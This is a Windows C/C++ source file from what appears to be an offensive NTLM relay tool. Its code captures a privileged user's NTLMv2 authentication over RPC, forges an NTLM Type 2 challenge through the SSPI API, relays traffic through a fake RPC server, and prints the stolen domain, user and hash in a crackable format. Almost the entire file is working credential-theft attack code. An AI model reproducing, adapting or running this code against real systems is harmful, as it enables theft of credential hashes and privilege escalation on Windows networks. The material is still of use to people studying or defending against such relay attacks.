#define SECURITY_WIN32 
#define WIN32_LEAN_AND_MEAN

#include "Windows.h"
#include "stdio.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <security.h>
#include <schannel.h>
#include "RPCCaptureServer.h"
#include "RelayLib.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Secur32.Lib")

#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS

#define DEFAULT_BUFLEN 8192

#define NTLMv2_TYPE2_SERVER_CHALLENGE_LENGTH 8
#define NTLMv2_TYPE2_SERVER_CHALLENGE_OFFSET 24
#define NTLMv2_TYPE2_RESERVED_OFFSET 32
#define NTLMv2_TYPE3_NTPROOFSTR_LENGTH 16
#define NTLMv2_TYPE3_RESPONSE_LENGTH_OFFSET 20
#define NTLMv2_TYPE3_RESPONSE_OFFSET_OFFSET 24

extern BOOL g_SuccessTrigger;

void DoRpcServerCaptureCredsHash(wchar_t* rpcServerIp, wchar_t* rpcServerPort, wchar_t* rpcRelayServerListeningPort) {
	int iResult = 0;
	int ntlmIndex = 0;
	int recvbuflen = DEFAULT_BUFLEN;
	int sendbuflen = DEFAULT_BUFLEN;
	char sendbuf[DEFAULT_BUFLEN];
	char recvbuf[DEFAULT_BUFLEN];
	char ntlmType1[DEFAULT_BUFLEN];
	char ntlmType2[DEFAULT_BUFLEN];
	int ntlmType2Len = 0;
	char ntlmType3[DEFAULT_BUFLEN];
	int ntlmType3Len = 0;
	char type1BakBuffer[DEFAULT_BUFLEN];
	int type1BakLen = 0;

	SOCKET RPCSocketListen = CreateRPCSocketListen(rpcRelayServerListeningPort);
	SOCKET RPCSocketReflect = CreateRPCSocketReflect(rpcServerIp, rpcServerPort);

	do {
		iResult = recv(RPCSocketListen, recvbuf, recvbuflen, 0);
		ntlmIndex = findNTLMBytes(recvbuf, iResult);
		// if the rpc packet contains ntlm auth information we do our magic (cross protocol relay)
		if (ntlmIndex > 0) {
			// save the rpc packet of type1 authentication to forward it later to the fake RPC server (we reuse the RogueOxidResolver)
			memcpy(type1BakBuffer, recvbuf, iResult);
			type1BakLen = iResult;
			// copy in ntlmType1 the extracted auth information from the received buffer
			memcpy(ntlmType1, recvbuf + ntlmIndex, iResult - ntlmIndex);
			// forge the ntlm type2 message using the win32 api
			ForgeNtlmType2(ntlmType1, iResult - ntlmIndex, ntlmType2, &ntlmType2Len);
			// here we zero'd out the Reserved field to force a remote authentication on localhost. If this value is not set to 0 the auth will be broken.
			memset(ntlmType2 + NTLMv2_TYPE2_RESERVED_OFFSET, 0, 8);
			// here we communicate with our fake RPC Server to have just the template for rpc packets, sending the type1
			if (send(RPCSocketReflect, type1BakBuffer, type1BakLen, 0) == SOCKET_ERROR) {
				printf("[!] Couldn't communicate with the fake RPC Server\n");
				break;
			}
			// receiving the type2 message from the fake RPC Server to use as a template for our relayed auth
			iResult = recv(RPCSocketReflect, recvbuf, recvbuflen, 0);
			if (iResult == SOCKET_ERROR) {
				printf("[!] Couldn't receive the type2 message from the fake RPC Server\n");
				break;
			}
			// get the ntlmindex from the type2 message received from the fake rpc server
			ntlmIndex = findNTLMBytes(recvbuf, iResult);
			// in this function we take the packet template from a real rpc server and we alter the authentication part, 
			// in this case we change the original type2 with the type2 received by the http server. We also adjust the len of the rpc packet fragLen and authLen
			// to not break the rpc protocol
			ForgeAndAlterType2Rpc(recvbuf, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
			// send the altered type2 to the rpc client (the privileged auth)
			if (send(RPCSocketListen, sendbuf, ntlmIndex + ntlmType2Len, 0) == SOCKET_ERROR) {
				printf("[!] Couldn't send the altered type2 to the rpc client (the privileged auth)\n");
				break;
			}
			// receive the type3 auth from the rpc client. This is the privileged AUTH that the client is sending us
			iResult = recv(RPCSocketListen, recvbuf, recvbuflen, 0);
			if (iResult == SOCKET_ERROR) {
				printf("[!] Couldn't receive the type3 auth from the rpc client\n");
				break;
			}
			// extract the type3 auth from the rpc packet
			ExtractType3FromRpc(recvbuf, iResult, ntlmType3, &ntlmType3Len);
			// now we extract all the required data to print the hash in the lc format:
			PrintCapturedHash(ntlmType2, ntlmType3);
			break;
		}
	} while (iResult > 0);
	closesocket(RPCSocketListen);
	closesocket(RPCSocketReflect);
	WSACleanup();
}

void ForgeNtlmType2(char* ntlmType1, int ntlmType1Len, char* ntlmType2, int* ntlmType2Len) {
	CredHandle hCred;
	SecBufferDesc secClientBufferDesc, secServerBufferDesc;
	SecBuffer secClientBuffer, secServerBuffer;
	PCtxtHandle phContext;

	TCHAR lpPackageName[1024] = L"NTLM";
	TimeStamp ptsExpiry;

	int status = AcquireCredentialsHandle(
		NULL,
		lpPackageName,
		SECPKG_CRED_INBOUND,
		NULL,
		NULL,
		0,
		NULL,
		&hCred,
		&ptsExpiry);

	if (status != SEC_E_OK)
	{
		printf("Error in AquireCredentialsHandle\n");
		return;
	}

	InitTokenContextBuffer(&secClientBufferDesc, &secClientBuffer);
	InitTokenContextBuffer(&secServerBufferDesc, &secServerBuffer);

	phContext = new CtxtHandle();

	secClientBuffer.cbBuffer = static_cast<unsigned long>(ntlmType1Len);
	secClientBuffer.pvBuffer = ntlmType1;

	ULONG fContextAttr;
	TimeStamp tsContextExpiry;

	status = AcceptSecurityContext(
		&hCred,
		nullptr,
		&secClientBufferDesc,
		ASC_REQ_ALLOCATE_MEMORY,
		SECURITY_NATIVE_DREP,
		phContext,
		&secServerBufferDesc,
		&fContextAttr,
		&tsContextExpiry);

	*ntlmType2Len = secServerBuffer.cbBuffer;
	memcpy(ntlmType2, (char*)secServerBuffer.pvBuffer, secServerBuffer.cbBuffer);
}

void InitTokenContextBuffer(PSecBufferDesc pSecBufferDesc, PSecBuffer pSecBuffer)
{
	pSecBuffer->BufferType = SECBUFFER_TOKEN;
	pSecBuffer->cbBuffer = 0;
	pSecBuffer->pvBuffer = nullptr;

	pSecBufferDesc->ulVersion = SECBUFFER_VERSION;
	pSecBufferDesc->cBuffers = 1;
	pSecBufferDesc->pBuffers = pSecBuffer;
}

void PrintCapturedHash(char *ntlmType2, char* ntlmType3) {
	unsigned char serverChallenge[8];
	unsigned char NTProofStr[16];
	unsigned char NTLMResponse[268];
	int* ntlmType3Offset;
	unsigned short* ntlmType3Length;

	short* domainLen, * userLen, * hostnameLen;
	__int32* domainOffset, * userOffset, * hostnameOffset;
	wchar_t domain[32], user[32], hostname[32];

	// parsing user info
	domainLen = (short*)(ntlmType3 + 28);
	userLen = (short*)(ntlmType3 + 36);
	hostnameLen = (short*)(ntlmType3 + 44);
	domainOffset = (__int32*)(ntlmType3 + 32);
	userOffset = (__int32*)(ntlmType3 + 40);
	hostnameOffset = (__int32*)(ntlmType3 + 48);
	memset(domain, 0, 32);
	memcpy(domain, ntlmType3 + (*domainOffset), *domainLen);
	memset(user, 0, 32);
	memcpy(user, ntlmType3 + (*userOffset), *userLen);
	memset(hostname, 0, 32);
	memcpy(hostname, ntlmType3 + (*hostnameOffset), *hostnameLen);

	// parsing captured hash
	memcpy(serverChallenge, &ntlmType2[NTLMv2_TYPE2_SERVER_CHALLENGE_OFFSET], NTLMv2_TYPE2_SERVER_CHALLENGE_LENGTH);
	ntlmType3Length = (unsigned short*)(ntlmType3 + NTLMv2_TYPE3_RESPONSE_LENGTH_OFFSET);
	ntlmType3Offset = (int*)(ntlmType3 + NTLMv2_TYPE3_RESPONSE_OFFSET_OFFSET);
	memcpy(NTProofStr, &ntlmType3[*ntlmType3Offset], NTLMv2_TYPE3_NTPROOFSTR_LENGTH);
	memcpy(NTLMResponse, &ntlmType3[(*ntlmType3Offset) + NTLMv2_TYPE3_NTPROOFSTR_LENGTH], *ntlmType3Length- NTLMv2_TYPE3_NTPROOFSTR_LENGTH);

	if (wcslen(user) < 2) {
		printf("[!] Couldn't capture the user credential hash :(\n");
		return;
	}

	g_SuccessTrigger = TRUE;

	// printing the golden data, format inspired by Responder :D
	printf("[+] User hash stolen!\n");
	printf("\n");
	printf("NTLMv2 Client\t: %S\n", hostname);
	printf("NTLMv2 Username\t: %S\\%S\n", domain, user);
	printf("NTLMv2 Hash\t: %S::%S:", user, domain);
	for (int i = 0; i < NTLMv2_TYPE2_SERVER_CHALLENGE_LENGTH; i++)
		printf("%02x", serverChallenge[i]);
	printf(":");
	for (int i = 0; i < NTLMv2_TYPE3_NTPROOFSTR_LENGTH; i++)
		printf("%02x", NTProofStr[i]);
	printf(":");
	for (int i = 0; i < *ntlmType3Length - NTLMv2_TYPE3_NTPROOFSTR_LENGTH; i++)
		printf("%02x", NTLMResponse[i]);
	printf("\n\n");
	//hexDump2((char*)"\nserverChallenge\n", serverChallenge, NTLMv2_TYPE2_SERVER_CHALLENGE_LENGTH);
	//hexDump2((char*)"\nNTProofStr\n", NTProofStr, NTLMv2_TYPE3_NTPROOFSTR_LENGTH);
	//hexDump2((char*)"\nNTLMResponse\n", NTLMResponse, *ntlmType3Length - NTLMv2_TYPE3_NTPROOFSTR_LENGTH);
}
